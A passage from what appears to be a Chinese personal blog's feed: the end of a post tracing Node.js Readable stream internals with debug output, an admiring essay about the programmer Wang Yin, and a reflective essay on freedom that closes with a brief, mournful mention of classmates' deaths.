class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>eventEmitter实现里关于函数参数也有些优化黑魔法，如果哪天写那个再说吧。</p>
<p>之后stream的接口和实现趋于稳定，修修改改提升效率，更新文档，专注应用。</p>
<h2 id="代码">代码</h2><p>参考<a href="https://github.com/nodejs/node/blob/292218828eea50861680ac9276b1b764e7342134/lib/_stream_readable.js" target="_blank" rel="external">_stream_readable源码</a>，我们看到为了处理各种历史遗留问题不一致的API、混乱的状态管理、同步异步代码一片混杂、古老冗余的javascript语法和各种黑魔法。。。</p>
<p>不管怎样，来段代码follow一下程序流程好了，这篇文章告结。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌─[reverland@reverland-R478-R429] - [~<span class="regexp">/tmp/</span>stream/stream-explore] - [<span class="number">2015</span>-<span class="number">12</span>-<span class="number">20</span> <span class="number">10</span>:<span class="number">18</span>:<span class="number">25</span>]</span><br><span class="line">└─[<span class="number">0</span>] &lt;&gt; cat read.js </span><br><span class="line"><span class="keyword">var</span> Readable = <span class="built_in">require</span>(<span class="string">'stream'</span>).Readable;</span><br><span class="line"><span class="keyword">var</span> inherits = <span class="built_in">require</span>(<span class="string">'util'</span>).inherits;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> EMIT;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Source</span>(<span class="params">opts</span>) </span>&#123;</span><br><span class="line">  Readable.call(<span class="keyword">this</span>, opts);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">inherits(Source, Readable);</span><br><span class="line"></span><br><span class="line">Source.prototype._read = <span class="function"><span class="keyword">function</span>(<span class="params">size</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (EMIT)</span><br><span class="line">    <span class="keyword">this</span>.push(<span class="string">'Mary has a little lamb'</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">this</span>.push(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> s = <span class="keyword">new</span> Source()</span><br><span class="line">s.read();</span><br></pre></td></tr></table></figure>
<p>debug的使用参见NodeJS文档，得到如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">STREAM <span class="number">5102</span>: <span class="built_in">read</span> undefined ...................................................................(<span class="number">1</span>)</span><br><span class="line">STREAM <span class="number">5102</span>: need readable <span class="literal">false</span> ..............................................................(<span class="number">2</span>)</span><br><span class="line">STREAM <span class="number">5102</span>: length less than watermark <span class="literal">true</span> ..................................................(<span class="number">3</span>)</span><br><span class="line">STREAM <span class="number">5102</span>: <span class="keyword">do</span> <span class="built_in">read</span> ..........................................................................(<span class="number">4</span>)</span><br><span class="line">STREAM <span class="number">5102</span>: emitReadable null ................................................................(<span class="number">5</span>)</span><br><span class="line"><span class="number">1</span> .............................................................................................(<span class="number">6</span>)</span><br><span class="line">STREAM <span class="number">5102</span>: emit readable ....................................................................(<span class="number">7</span>)</span><br><span class="line">STREAM <span class="number">5102</span>: flow null ........................................................................(<span class="number">8</span>)</span><br><span class="line">STREAM <span class="number">5102</span>: maybeReadMore <span class="built_in">read</span> <span class="number">0</span> .............................................................(<span class="number">9</span>)</span><br><span class="line">STREAM <span class="number">5102</span>: <span class="built_in">read</span> <span class="number">0</span> ...........................................................................(<span class="number">10</span>)</span><br><span class="line">STREAM <span class="number">5102</span>: need readable <span class="literal">true</span> ...............................................................(<span class="number">11</span>)</span><br><span class="line">STREAM <span class="number">5102</span>: length less than watermark <span class="literal">true</span> ..................................................(<span class="number">12</span>)</span><br><span class="line">STREAM <span class="number">5102</span>: <span class="keyword">do</span> <span class="built_in">read</span> ..........................................................................(<span class="number">13</span>)</span><br></pre></td></tr></table></figure>
<p>我们看到<code>read()</code></p>
<ul>
<li><a href="https://github.com/nodejs/node/blob/292218828eea50861680ac9276b1b764e7342134/lib/_stream_readable.js#L251" target="_blank" rel="external">(1)</a>read()函数被调用，undefined是参数</li>
<li><a href="https://github.com/nodejs/node/blob/292218828eea50861680ac9276b1b764e7342134/lib/_stream_readable.js#L305" target="_blank" rel="external">(2)</a>needReadable状态还为false</li>
<li><a href="https://github.com/nodejs/node/blob/292218828eea50861680ac9276b1b764e7342134/lib/_stream_readable.js#L310" target="_blank" rel="external">(3)</a>state.length为0， 因此缓冲区长度还小于highWaterMark, doRead标志变为 true</li>
<li><p><a href="https://github.com/nodejs/node/blob/292218828eea50861680ac9276b1b764e7342134/lib/_stream_readable.js#L320" target="_blank" rel="external">(4)</a>由于doRead为true, 于是state.reading为true， state.sync为true，再state.length为0时， state.needReadable变成true。调用_read。将state.sync变回false</p>
</li>
<li><p><a href="https://github.com/nodejs/node/blob/292218828eea50861680ac9276b1b764e7342134/lib/_stream_readable.js#L99" target="_blank" rel="external">(5)</a>进入我们的_read实现中，我们的_read调用push。而push调用<a href="https://github.com/nodejs/node/blob/292218828eea50861680ac9276b1b764e7342134/lib/_stream_readable.js#L123" target="_blank" rel="external">readableAddChunk</a>。在这个函数中，由于state.needReadable为true, 调用<a href="https://github.com/nodejs/node/blob/292218828eea50861680ac9276b1b764e7342134/lib/_stream_readable.js#L157" target="_blank" rel="external">emitReadable</a>。此时state.sync为true，把emitReadable_安排到下一次eventLoop中。于是出现(6).<a href="https://github.com/nodejs/node/blob/292218828eea50861680ac9276b1b764e7342134/lib/_stream_readable.js#L141" target="_blank" rel="external">这里</a>state.reading变为false，就是说push会中止读取状态。</p>
</li>
<li><a href="https://github.com/nodejs/node/blob/292218828eea50861680ac9276b1b764e7342134/lib/_stream_readable.js#L410" target="_blank" rel="external">(7)</a>emitReadable_内</li>
<li><p><a href="https://github.com/nodejs/node/blob/292218828eea50861680ac9276b1b764e7342134/lib/_stream_readable.js#L740" target="_blank" rel="external">(8)</a>state.flowing为null，显然，我们不是flowing模式。</p>
</li>
<li><p><a href="https://github.com/nodejs/node/blob/292218828eea50861680ac9276b1b764e7342134/lib/_stream_readable.js#L433" target="_blank" rel="external">(9)</a><br>从<a href="https://github.com/nodejs/node/blob/292218828eea50861680ac9276b1b764e7342134/lib/_stream_readable.js#L160" target="_blank" rel="external">(5)</a>继续执行。调用<a href="https://github.com/nodejs/node/blob/292218828eea50861680ac9276b1b764e7342134/lib/_stream_readable.js#L422" target="_blank" rel="external">maybeReadMore</a>，由于state.readingMore还是false,变为true，将maybeReadMore_放到nextTick.于是这里就开始read(0)</p>
</li>
<li><p><a href="https://github.com/nodejs/node/blob/292218828eea50861680ac9276b1b764e7342134/lib/_stream_readable.js#L251" target="_blank" rel="external">(10)</a> read(0)中</p>
</li>
<li><p><a href="https://github.com/nodejs/node/blob/292218828eea50861680ac9276b1b764e7342134/lib/_stream_readable.js#L305" target="_blank" rel="external">(11)</a>所以state.needReadable变成了true</p>
</li>
<li><a href="https://github.com/nodejs/node/blob/292218828eea50861680ac9276b1b764e7342134/lib/_stream_readable.js#L310" target="_blank" rel="external">(12)</a>state.length - n比watermark少继续读</li>
<li><a href="https://github.com/nodejs/node/blob/292218828eea50861680ac9276b1b764e7342134/lib/_stream_readable.js#L321" target="_blank" rel="external">(13)</a>继续读。。。</li>
</ul>
<p>have fun!</p>
<h2 id="参考文献">参考文献</h2><p>关于NodeJS其中那个的流及其发展的资料</p>
<ul>
<li><a href="https://strongloop.com/strongblog/whats-new-io-js-beta-streams3/" target="_blank" rel="external">whats-new-io-js-beta-streams3</a></li>
<li><a href="https://nodejs.org/en/blog/feature/streams2/" target="_blank" rel="external">A New Streaming API for Node v0.10</a></li>
<li><a href="https://nodejs.org/api/stream.html" target="_blank" rel="external">Stream Node.js v5.3.0 Manual &amp; Documentation</a></li>
<li><a href="http://codewinds.com/blog/2013-07-25-streams-what-why.html" target="_blank" rel="external">What are Node.js streams?</a></li>
<li><a href="https://github.com/nodejs/node/blob/master/CHANGELOG.md" target="_blank" rel="external">Node.js ChangeLog</a></li>
<li><a href="http://www.mariocasciaro.me/the-strange-world-of-node-js-design-patterns" target="_blank" rel="external">the-strange-world-of-node-js-design-patterns</a></li>
<li><a href="http://nodestreams.com/" target="_blank" rel="external">Node.js Stream Playground</a></li>
<li><a href="http://howtonode.org/streams-explained" target="_blank" rel="external">Daddy, what’s a stream?</a></li>
<li><a href="https://r.va.gg/2014/06/why-i-dont-use-nodes-core-stream-module.html" target="_blank" rel="external">Why I don’t use Node’s core ‘stream’ module</a></li>
<li><a href="https://streams.spec.whatwg.org" target="_blank" rel="external">Streams Living Standard — Last Updated 28 December 2015</a></li>
<li><a href="http://thlorenz.com/stream-viz/" target="_blank" rel="external">Stream-Viz</a></li>
<li><a href="https://github.com/substack/stream-handbook" target="_blank" rel="external">stream-handbook</a></li>
<li><a href="https://blog.risingstack.com/functional-reactive-programming-with-the-power-of-nodejs-streams/" target="_blank" rel="external">Functional Reactive Programming with the Power of Node.js Streams</a></li>
<li><a href="https://github.com/dominictarr/event-stream" target="_blank" rel="external">event-stream</a><br>  FIXME:</li>
<li><a href="https://brycebaril.github.io/streams2-presentation/" target="_blank" rel="external">Streams2 - Node.js Streams2 Demystified, by Bryce Baril</a></li>
</ul>
<p>非NodeJS关于流和backpressure，说明这是随着计算机实践发展应运而生的编程方式和需求。</p>
<ul>
<li><a href="http://www.reactive-streams.org/" target="_blank" rel="external">Reactive Streams</a></li>
<li><a href="http://doc.akka.io/docs/akka-stream-and-http-experimental/1.0-RC2/java/stream-flows-and-basics.html" target="_blank" rel="external">Basics and working with Flows - Akka Documentation</a></li>
<li><a href="http://www.smartjava.org/content/visualizing-back-pressure-and-reactive-streams-akka-streams-statsd-grafana-and-influxdb" target="_blank" rel="external">visualizing-back-pressure-and-reactive-streams-akka-streams-statsd-grafana-and-influxdb</a></li>
<li><a href="https://github.com/ReactiveX/RxJava/wiki/Backpressure" target="_blank" rel="external">Backpressure - ReactiveX/RxJava Wiki</a></li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>流是Node中最好也最被误解的概念。</p>
<p>–<a href="https://github.com/dominictarr/event-stream" target="_blank" rel="external">dominictarr<]]>
    </summary>
    
      <category term="javascript" scheme="http://reverland.org/tags/javascript/"/>
    
      <category term="nodejs" scheme="http://reverland.org/tags/nodejs/"/>
    
      <category term="javascript" scheme="http://reverland.org/categories/javascript/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[王垠大萌神]]></title>
    <link href="http://reverland.org/reviews/2015/12/14/wangyin/"/>
    <id>http://reverland.org/reviews/2015/12/14/wangyin/</id>
    <published>2015-12-13T16:00:00.000Z</published>
    <updated>2015-12-14T13:15:38.030Z</updated>
    <content type="html"><![CDATA[<p>竟然发现简书上有一个专题——<a href="http://www.jianshu.com/collection/a4b3808d0206" target="_blank" rel="external">王垠大萌神语录</a>。我震惊了，原来不只一个人觉得他萌啊233</p>
<h2 id="王垠大萌神">王垠大萌神</h2><p>我不想在人后评断他人，圣经就说过，你如何评断他人，你也将怎样被评断。我怎么有能力去评判比我强的人呢？又凭什么评断不比我强的人呢？我又如何能评断强弱呢？我站在“环中”并不说话，这是最好的，但你们一定要问我，我对王垠膜不膜拜。他这么牛逼我这么能不膜拜呢？</p>
<p>我是一个 Linux 用户，时光回溯到2011年，看到王垠大萌神2003年写的<a href="http://dywang.csie.cyut.edu.tw/dywang/linux-wangyin/" target="_blank" rel="external">完全用Linux工作</a>，可惜那时候我已经完全用 Linux 工作了，我看到这篇文章想啊，浓烈的自由软件用户的信仰风格啊，这是怎样一种追求和宣扬自由的精神啊。我那时因为 SAS 的天价称为R语言的脑残粉，认识开源运动，知道世界上还有这么一种神奇的存在，那种开放、分享、自由与进步的精神给养就这么开始浸润我的生活态度和人生观。然而在身边的人看来是什么态度呢？这什么玩意？好玩吗？能赚钱吗？能把妹吗？有什么好处？我。。。我不知道。。。</p>
<p>我特么以为我他妈的是傻逼啊，对着黑乎乎的屏幕做着傻逼都不屑一顾的傻逼事情啊。直到我看到了王垠的这篇文章。忽然发现， <strong>我不是一个人在傻逼啊</strong> 。</p>
<p>那感觉比看到 Paul Graham那篇<a href="">为什么书呆子不受欢迎</a>更为振聋发聩。</p>
<p>我知道他文有偏颇，有些事情隐而不言。知道他观点尖锐力图在智商上碾压政见不同者。但我还是喜欢那篇文章，也觉得其中偏颇和傲慢无关紧要。然而人心如何，看看众人的评论就知道了。</p>
<p>多年后，王垠大萌神不知道受到谁的刺激又发布了一篇<a href="http://www.lofter.com/postentry?from=search&amp;permalink=183ec2_479bfc" target="_blank" rel="external">写给支持和反对《完全用Linux工作》的人们</a>，又引来一阵咒骂声，为之感慨万分。对有些人，不过茶余饭后谈资，然而那些拼命往道德高地挤着极尽嘲弄伤害的评论，不得不说让我对这个世界的认识更加深刻和冷峻。我也天天在这里瞎逼写些东西，还反反复复来来去去，从来不顾及观众们的心理，好在没什么人鸟我。该不该庆幸呢？</p>
<p>看王垠这些年的博文写了又删，一阵阵反反复复，心中一定烦乱不堪吧。凡与众不同的人，凡是想超越生存环境的人，都会有这种经历吧。凡是自己想过自己挣扎过，没有闷头听话随波逐流的人都会体会到吧。</p>
<p>凡是看世人对王垠的评价，无非各种非议，又是其性格有问题又是其太狂傲，我就想不明白他就算真那么不讨你们喜欢那些恶毒至极的背后评论跟你什么关系？碍着你赚钱吹牛逼忽悠人了？</p>
<p>也许还真碍着了。有兴趣看看我眼中的王垠这些年都说了些什么么？</p>
<h3 id="思考。">思考。</h3><blockquote>
<p>我们每个人都是工具的奴隶。随着我们的学习，我们不断的加深自己对工具的认识，从而从它们里面解脱出来。现在我就来说一下我作为各种工具的奴隶，以及逐渐摆脱它们的“思想控制”的历史吧。</p>
</blockquote>
<p>我觉得这是王垠思想一以贯之的东西，不断的认识，不断的脱离控制追寻自由，不断地解放自己。他说推崇用 Linux， 他说他推崇不用 Linux，他说你们要自己思考别听他也别听别人瞎逼说用不用 Linux。他经常想无不言，言无不喷。说这个设计简直渣，那个一塌糊涂。看起来不很可爱，当然，被喷的人可能不这么想，那傻逼还当真了哈哈。</p>
<h3 id="平等。">平等。</h3><blockquote>
<p>它们对我来说不再是什么神物，它们的设计者对我来说也不再是高不可攀的权威。</p>
</blockquote>
<p>如果你没听信关于王垠言论铺天盖地的是非之辩，应该能体会到王垠大萌神多么敢质疑权威。你觉得他算那根葱竟敢质疑这个质疑那个，这种质疑和他的就好像不太一样了。我觉得王垠萌萌的啊，一思考唉这个不太对劲不该这样设计吧，他也不管谁设计的谁钦定的不是？</p>
<p>我这些年见过太多大忽悠的宣传，哦，不是说他们宣传自己多牛逼多牛逼，牛逼到这天蔽日而没有达到这个境界。而是，搞得你跟神似的，所有和你不一样的都是思路一条，唯有追随你的引领才能走向光明的感觉。我他妈的一看到这种宣传，再看到人群趋之若鹜，就开始怀疑世界了。</p>
<blockquote>
<p>消灭广告所造成的幻觉，最好的办法就是去尝试，去实地的考察它。有些虚幻的东西只要你第一次尝试就会像肥皂泡一样破灭掉。可是如果你不主动去接触它，它就会一直在你脑海里造成一种美好神圣的假象。越是得不到的越是觉得美好。很神奇的一个现象就是，权威对人思想的作用其实也跟广告一样。</p>
</blockquote>
<p>没什么人会这么说，大概也只有王垠这种普遍大众认为的”退学三次被开不知几次与人无法相处的Loser”能发出这种话了。我上一次听说有人说你们都是平等的是在听说佛陀还是庄子这么说来着？王大神告诉大家你们肯学实践肯实践，你们都能作出优秀的设计和blabla。所以，很多人只看到王垠在吹捧自己，厌恶之心生鳄鱼相加。为啥我看到的意思不一样呢？一定是我歪解了王垠大萌神的意思。</p>
<p>追随大师是如何追随？只有别有用心的人才会让你盲从，只有想从你身上捞得好处，忽悠你为其做牛做马的人才会对你的质疑当头棒喝。所以我见许多人说政府怎么怎么恨不得革命？却没看到无所不在每个人身边围绕的隐形的力量。我真觉得很震惊，一定是我太傻逼了。</p>
<p>追随大师该如何追随？为啥你还没学个什么东西，就有人给你说，看XXX就好，还有人提供各种练级指南，好像沿着这条康庄大道一切都美好起来，康庄大道不用思考，康庄大道只用花钱买服务。</p>
<p>你思考过吗？你摸索过吗？你知道那些融会贯通的感觉吗？你是工具和思想一切外物的奴隶还是自由随心的人？</p>
<p>王垠那里很多人看到了情商低、性格缺陷、不堪重用。你们会和他一起工作吗，知道身边的人怎么评价他吗？你们曾会让他给你工作吗？就这么凭几篇文章，我看我最好把这篇博客的文章都删掉省得将来被贴上些莫名奇妙的标签。</p>
<p>我们的工业体系依然在花大价钱制造”适合”的工具。请参照<a href="http://e.jd.com/30165477.html" target="_blank" rel="external">盗梦工厂</a>。是谁在期望我们称为怎样的人呢？你又该称为怎样的人呢？我在王垠大萌神那里看到了光，而不是暗。当然，我不在乎他的随性而发的言论对你们的员工还是什么产生了什么不良影响让他们不听话了还是不怎样了。这种小心眼纯粹是自讨苦吃。</p>
<p>这个时代，有些东西比知识重要千倍万倍。我一直觉得我的价值观有问题，知道我看到了和我有同样问题的王垠大萌神。哦，或许，只是我眼里的王垠大萌神。</p>
<h3 id="真性情。">真性情。</h3><p>红楼梦中，你们最喜欢谁呢，最讨厌谁呢？你讨厌的人物真的讨厌吗？你喜欢的真的值得喜欢吗？但并不影响我说我现在喜欢贾宝玉和黛玉，喜欢晴雯、喜欢刘姥姥、喜欢王熙凤、又喜欢贾母，几乎所有人吧，唯独不喜欢袭人和宝钗。</p>
<p>宝玉哪里好了？</p>
<blockquote>
<p>无故寻愁觅恨，有时似傻如狂；<br>纵然生得好皮囊，腹内原来草莽。<br>潦倒不通世务，愚顽怕读文章；<br>行为偏僻性乖张，那管世人诽谤！<br>富贵不知乐业，贫穷难耐凄凉；<br>可怜辜负好时光，于国于家无望。<br>天下无能第一，古今不肖无双；<br>寄言纨袴与膏粱，莫效此儿形状！</p>
</blockquote>
<p>一点也不好，作者都这样说了，为啥还感觉漫卷都是歌颂呢？</p>
<p>黛玉又哪里好了，刻薄小气，精神还有问题。但，你猜我喜欢他们哪里？</p>
<p>所以，有人一不小心看到了王垠大萌神的某些类似找妹子吹牛逼的文章，就觉得这傻逼又突破下限了。我依然觉得，可爱的可以啊。</p>
<p>中国有句古话，叫做闷声发大财。你能发财，你说你发财，你碍着别人心安理得发财，都会给自己招来祸患，所以，我还是乌龟一样拖着尾巴在泥巴里打滚好了。</p>
<h3 id="勇气">勇气</h3><p>王垠三次博士退学，把清华、Cornell、IU给喷了，把谷歌喷了，把 Coverity 喷了，似乎该得罪的都得罪了遍。是吗？真的像你想的这样你看得这样？</p>
<p>但这种张狂的和高调晒真是落人口实了，我却很佩服。</p>
<p>他知道他在理想主义的路上追寻着，还不曾屈服和停歇过。</p>
<p>我只知道世界需要这样的人，有这么一个人世界多了一抹风光。而自私自立的人太多太多有和没有没啥差别。</p>
<h3 id="最后">最后</h3><p>王垠的观点一直在变，他一直在思索在求证在成长。我不觉得他所谓的缺点对我算什么缺点，却知道他的优点闪闪发光。在一干众人眼里的傻逼，在一干众人眼里的天才，在一干众人眼里无关紧要的他。</p>
<p>我心里的王垠大萌神。</p>
<p>能看到我瞎逼写到这里的大概不会有几个了，今日看到的是谁，明日看到的是谁？请不要给我贴标签，不要给我戴帽子。我是傻逼，我所说的都是错的，我什么都没说。</p>
<blockquote>
<p>老板，这三个人的简历。</p>
<p>A．笃信巫医，有两个情妇，有多年的吸烟史，而且嗜酒如命。</p>
<p>B．曾经两次被赶出办公室，每天要到中午才起床，每晚都要喝大约一公升的白兰地，而且有过吸食鸦片的纪录。</p>
<p>C．曾是国家的战斗英雄，一直保持素食的习惯，不吸烟，偶尔喝一点啤酒，年轻时从未做过违法的事。</p>
</blockquote>
<p>祝愿大萌神安好！</p>
<h2 id="附录">附录</h2><ul>
<li><a href="http://www.yinwang.org/" target="_blank" rel="external">当然我在扯淡</a></li>
<li><a href="http://yinwang0.lofter.com/view" target="_blank" rel="external">Backup</a></li>
<li><a href="http://www.lijiaocn.com/blog/2014/08/01/%E9%82%A3%E4%BA%9B%E7%A8%8B%E5%BA%8F%E5%91%98.html" target="_blank" rel="external">那些程序员</a></li>
<li>[]</li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<p>竟然发现简书上有一个专题——<a href="http://www.jianshu.com/collection/a4b3808d0206" target="_blank" rel="external">王垠大萌神语录</a>。我震惊了，原来不只一个人觉得他萌啊233</p]]>
    </summary>
    
      <category term="people" scheme="http://reverland.org/tags/people/"/>
    
      <category term="reviews" scheme="http://reverland.org/categories/reviews/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[自由？]]></title>
    <link href="http://reverland.org/life/2015/12/06/freedom/"/>
    <id>http://reverland.org/life/2015/12/06/freedom/</id>
    <published>2015-12-06T06:52:01.000Z</published>
    <updated>2015-12-06T09:23:30.290Z</updated>
    <content type="html"><![CDATA[<p>我在这里写下这些字，无非想时过境迁后，也许还有机会回头看两眼。知道我当时怎样想过，为什么作出这样那样的选择。而选择，无关对错，无关物我，只关乎心心念念却终于没有勇气面对的遗憾。</p>
<p>絮絮叨叨，碎碎念念，有有无无，虚虚实实。</p>
<h2 id="自在飞花轻似梦">自在飞花轻似梦</h2><p>昨天做了一个梦，醒来的时候觉得恍恍惚惚。那种恍惚好象是庄子梦见了蝴蝶，恍恍惚惚以为自己是蝴蝶，不知自己真的是蝴蝶。我从梦中醒来，梦中的情绪、不舍、依恋，就好象真真切切发生着的，而却不知道自己是不是真的这样想。也许是心心念念，却为何要心心念念？为何心心念念，却觉得重重束缚动弹不得？既然动弹不得，也何必心心念念？</p>
<p>恍惚记得高中语文老师，说我们写作文是带着镣铐跳舞。我们带着镣铐把高考应付了。等到以为终于可以没有什么镣铐能限制我写些什么，却发现镣铐更多更重，更加难以琢磨和体察。言语也越发谨小慎微，不敢自由自在书写了。</p>
<p>然而还是写了，写了一堆又一堆文字如烟云和拉圾，时光流转，便湮灭成尘。但还是写着，以有穷之生追寻无穷的梦幻，至死方休。也许就像苏轼曾说，如鲠在喉，不吐不快。却如此小心翼翼，怕写错了字，怕说错了话，怕怕误导了他人，怕迷惑了自己，怕没有一点卵用浪费了时间，怕于观者中未激起一丝波澜，怕被人当做了傻逼贴上了标签，怕世界边缘的人又有何权利说什么？。。。凡此种种，诚惶诚恐。</p>
<p>然而，我也并不在乎看的人怎么想。写什么，终究是写给自己的，也是我与我的对话，我与天的叩问，我与非我的思索。请以己心度我心，当我写下这些字的时候，我心也不再是我心。当自以为认识的时候，也是隔阂产生的地方。知晓，是未知的开始。</p>
<p>仅以这些文字，纪念束缚心神的种种枷锁。</p>
<h2 id="落花有意随流水">落花有意随流水</h2><p>有所束缚，就有所自由。一无所有，最有勇气。多年后，如果零碎的文字没有散尽被闲暇之人看到这两句，不知他会不会有共鸣和感慨。还是他们的经历根本不会徒然生出这等没有缘由的苦，只会结无边无尽的甜。还是由于他们的生命重来未曾惶惑过，一开始便知道为何生，一出生便知道怎样死。愿如此，幸福也可以一以贯之。</p>
<p>我记得，有时候满怀热情做了自己觉得有意思的东西，他人无动于衷反问我，你做这个干什么，你为什么不那样呢？我有时候觉得很尴尬、有时候觉得很无奈、有时候愤怒觉得被当作傻逼、有时候伤心觉得他们不该这样问。然而我也不知道，我也何必一定知道？他们叩问我，我也叩问自己，但是问来问去这个问题啊，终于是没有答案，要回答者自己去找答案。这个答案却未必能让他人认同，也未必让过去将来的自己认同。然而并无所谓谁认同不认同，因为作出选择的是自己、作出选择就无所谓原因，必然有原因在他人看来也不算原因。所以我们的询问和解释与自我解释又都是为了什么，为了让我们在选择的路上更加坚定？那选择是正确的吗。过去的事情只能作出评价，评价却没有对错一说。将来的事情不是人力所能预测，不知将来，又凭借什么作出选择呢？现在和过去。现在和过去值得凭借吗？值得，又不值得。我说了些什么？它只在思考的人心中存在，只会在有用处的时候有用，它就像个屁，放过就没有了，它也根植在思维的深处，若想连根拔除，整个人都毁了吧。</p>
<p>你所作出的选择，便是那真真切切的选择，总是要作出，拒不选择也是一种选择。选择好坏都只是一种选择，而选择，是无关对错的，又是关乎对错的。在每个有所求奔忙路人的眼里，在每个有所畏惧匆忙蚂蚁的心里，再求不得的怨念中，放不下的不舍中。在我们心心念念的信念之中。</p>
<p>现实会打脸的，而且会毫不留情。我会坐在那里苦笑着咂摸着这味道感慨，还是哭着鼻子忍不得这切肤之痛？</p>
<p>我回头看二十多年，二十多年的纷乱心意、二十多年的自我安慰、二十多年关于没有未来的逃避，二十多年的以为唾手可得，二十多年的以为时日无多和如获新生。二十多年大梦一场，有生之年永远不醒吧。</p>
<p>看自己失去的错过的拥有终又失去的没有拥有也许会有失而复得的意外惊喜的种种种种，我想不起我为何做这个选择而不是那个选择，依稀只记得记得妥协和畏惧。没有对喜欢的女孩说出半句话，反而因为喜欢更加疏远了。没有敢远赴他乡看寻更大的世界，因为懒得折腾不想离家没有尝试省城的中学。没有对待自己的初心选择想要选择的专业，因为他人的说辞随随便便选择了随随便便的专业。没有好好珍惜幸福家庭和睦生活选择了任性伤害。凡此种种，我真该这么选择么？我真不该这么选择么？谁也不知道，因为对错也许根本就不存在。只是我心中有我、有欲望，有牵挂，有偏见，有是非之分。有得太多，就什么也没有。</p>
<p>我心中有意。</p>
<h2 id="花堪折时直须折">花堪折时直须折</h2><p>我本想写些人、写些事情。终究被一些我自己并不能明确的东西束缚了，一个字没提及具体的人和事。为何要评说人的身前身后，事情的来龙去脉。我真的有资格吗？真的没有资格吗？就算有资格评说，就应该在这里写出来吗？</p>
<p>几年之前，家里一本破碎的毛姆的《人生的枷锁》给了我很深的印象。然而印象却不是你想的那样，整本书几乎都忘干净了。只有一句话不断在今后的日子里被反复想起，现在我已经想不起那句话了，因为它已经是我的一部分，已经是我。感觉好奇怪，在镜子中看到自己，多年后才知道那不是荧幕。</p>
<p>如果我说：人们要为年轻时对未来的美好憧憬，付出饱尝幻灭之苦的惨痛代价。那么，憧憬便是不对的么，代价便是不好的么，幻灭就是不该的么。我想自由之途只有这一条，那条路通向的其实不是自由，我们叫它任何美丽的名字，我们叫它幸福，叫它平静，叫它道。这幻灭之路就是人生之路，失望与希望，欣喜与悲伤，意气风发与跌跌撞撞，回头看去，早晚化为笑谈。</p>
<p>所以，如果我做出什么选择，我不用举例、更不用证明、也无须争辩。选择必然有其原因，可原因只对我有意义。选择必然导致结果，结果却不是我能主导的。最后事过境迁，人们给出盖棺定论，好像事情真的这样或那样。我知道一定不是，但是与不是，只对有所欲望有所偏倚的人心有意义。与作出选择的人有多大关系呢。</p>
<p>作出的选择，仅仅追随自己的心，心是什么？虚无飘渺。我仅仅是作出了选择，可能因为慌乱、可能因为明智，然而都是他人评说的事情。而评说又有多大的意义呢？</p>
<p>一切有为法，如梦幻泡影，如露亦如电。</p>
<p>折腾便是折腾、生死和命运就是生死和命运。我想，这就是古人说谋事在人成事在天的意思吧。</p>
<h2 id="落红不是无情物">落红不是无情物</h2><p>内心被自由的人，外表却看上去自由放荡。内心自由的人，外表看上去却谨慎拘束。哪里有什么自由吗？</p>
<p>我不愿被不自由的操作系统和软件限制，却被自由的操作系统和软件限制。我选择开放自由的服务，却被开放和自由的服务限制。我希望选择更多，却被更多选择束缚得不知如何选择。那自由又在哪里呢，可望不可即。它是空中楼阁还是还是蜃楼。它真的不值得追寻吗?显然不是，那界限在何处呢？谁也不知道。</p>
<p>找工作的人将找到工作，是更自由了还是更约束了？谁也没答案，然而选择人一定会做，做选择的原因？只能靠事后遐想了。做出的选择对错，也只能靠事后遐想了。然而我真的选择了吗？还是无所选择终于走到今天这一步？我真的以为我自己能平静地面对这些？</p>
<p>我不能吗？</p>
<p>只是，今天又一次作出了选择，没有给论文写半个字。我想因为什么呢，因为未来没有许诺我所信奉的未来，未来的恐吓也不会击倒生活的勇气？</p>
<p>这是逃避还是无能为力？我内心的平静喜悦是因为自我的欺骗吗？随它去吧。</p>
<p>平静、勇气、爱与热情、我在意的人和当下的生活。是理由还是借口？</p>
<p>不管怎样，这是随心写出的字和随意作出的选择，无须理由，平静地连迟疑和犹豫都没有。我会再之后，勇敢地幻想什么吗？</p>
<p>会吗？你还会吗？</p>
<p>2015年12月06日。</p>
<p>ps: 多日前学五跳楼的同学安息。有过一面之缘，一起去腾讯实习面试时吹牛扯淡，之后一些往事细节才清晰浮现，逝者已矣，不再妄言。多日来学校和新闻都没注意到有什么消息，人的生死也是这么轻的一件事情。校庆前科研楼跳楼的同学好歹引起了新闻的骚动，还记得有人在那里摆下的鲜花，白得刺眼。死生亦大也，岂不痛哉！</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>我在这里写下这些字，无非想时过境迁后，也许还有机会回头看两眼。知道我当时怎样想过，为什么作出这样那样的选择。而选择，无关对错，无关物我，只关乎心心念念却终于没有勇气面对的遗憾。</p>
<p>絮絮叨叨，碎碎念念，有有无无，虚虚实实。</p>
<h2 id="自在飞花轻似梦"]]>
    </summary>
    
